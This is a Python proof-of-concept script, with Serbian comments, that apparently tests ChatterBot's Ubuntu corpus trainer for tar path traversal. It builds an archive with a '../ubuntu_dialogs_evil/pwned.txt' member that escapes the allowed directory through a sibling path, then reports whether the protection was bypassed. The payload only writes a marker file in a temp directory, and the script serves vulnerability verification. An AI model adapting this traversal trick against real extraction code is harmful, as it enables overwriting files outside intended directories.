
import os
import sys
import tarfile
import tempfile

# import chatterbot iz submodula
KOREN = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(KOREN, 'ChatterBot'))

from chatterbot import ChatBot
from chatterbot.trainers import UbuntuCorpusTrainer


def napravi_zlonamernu_arhivu(radni_direktorijum):
    # sestrinski direktorijum prolazi zastitu
    sadrzaj = os.path.join(radni_direktorijum, 'pwned.txt')
    with open(sadrzaj, 'w', encoding='utf-8') as f:
        f.write('Ovaj fajl je zavrsio van dozvoljenog direktorijuma.')

    putanja_arhive = os.path.join(radni_direktorijum, 'malicious.tar')
    with tarfile.open(putanja_arhive, 'w') as arhiva:
        arhiva.add(sadrzaj, arcname='../ubuntu_dialogs_evil/pwned.txt')

    return putanja_arhive


def main():
    radni = tempfile.mkdtemp(prefix='chatterbot_poc_')

    # trener raspakuje u ubuntu_dialogs
    data_directory = os.path.join(radni, 'ubuntu_data')
    dozvoljeni = os.path.join(data_directory, 'ubuntu_dialogs')
    os.makedirs(dozvoljeni, exist_ok=True)

    arhiva = napravi_zlonamernu_arhivu(radni)

    bot = ChatBot('PoC', database_uri=None, initialize=False)
    trener = UbuntuCorpusTrainer(bot, ubuntu_corpus_data_directory=data_directory)

    print('Dozvoljeni direktorijum :', dozvoljeni)
    print('Clan arhive             : ../ubuntu_dialogs_evil/pwned.txt')

    try:
        trener.extract(arhiva)
        print('Rezultat extract()      : PROSAO bez izuzetka')
    except Exception as greska:
        print('Rezultat extract()      : blokirano ->', type(greska).__name__, greska)

    pobegli_fajl = os.path.join(data_directory, 'ubuntu_dialogs_evil', 'pwned.txt')
    uspeh = os.path.exists(pobegli_fajl)

    print('Fajl van dozvoljenog dir.:', uspeh)
    print('Putanja                 :', pobegli_fajl)
    print()
    print('ZAKLJUCAK:', 'ZASTITA JE PROBIJENA' if uspeh else 'zastita je izdrzala')

    # 0 znaci da ranjivost postoji
    return 0 if uspeh else 1


if __name__ == '__main__':
    sys.exit(main())
